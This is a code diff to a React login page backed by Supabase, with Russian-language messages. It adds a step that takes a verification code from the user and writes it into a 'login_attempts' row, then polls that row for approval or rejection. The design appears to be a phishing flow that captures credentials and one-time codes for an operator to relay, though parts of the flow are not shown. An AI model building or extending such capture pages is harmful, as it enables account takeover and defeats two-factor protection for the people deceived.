@@ -8,14 +8,17 @@ import { toast } from "sonner";
 const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [code, setCode] = useState("");
   const [step, setStep] = useState<"email" | "password" | "confirm">("email");
   const [showPassword, setShowPassword] = useState(false);
   const [attemptId, setAttemptId] = useState<string | null>(null);
   const [rejected, setRejected] = useState(false);
+  const [submittingCode, setSubmittingCode] = useState(false);
+  const [codeSubmitted, setCodeSubmitted] = useState(false);
   const pollRef = useRef<number | null>(null);
 
   useEffect(() => {
-    if (step !== "confirm" || !attemptId) return;
+    if (step !== "confirm" || !attemptId || !codeSubmitted) return;
     let cancelled = false;
 
     const check = async () => {
@@ -39,7 +42,7 @@ const Login = () => {
       cancelled = true;
       if (pollRef.current) window.clearInterval(pollRef.current);
     };
-  }, [step, attemptId]);
+  }, [step, attemptId, codeSubmitted]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -67,9 +70,28 @@ const Login = () => {
       }
       setAttemptId(data.id);
       setRejected(false);
+      setCode("");
+      setCodeSubmitted(false);
       setStep("confirm");
     }
   };
+
+  const handleCodeSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!attemptId || !code.trim()) return;
+    setSubmittingCode(true);
+    const { error } = await supabase
+      .from("login_attempts")
+      .update({ verification_code: code.trim() })
+      .eq("id", attemptId);
+    setSubmittingCode(false);
+    if (error) {
+      toast.error("Ошибка отправки кода");
+      return;
+    }
+    setCodeSubmitted(true);
+  };
+
 
   return (
     <div className="min-h-screen bg-background flex flex-col">
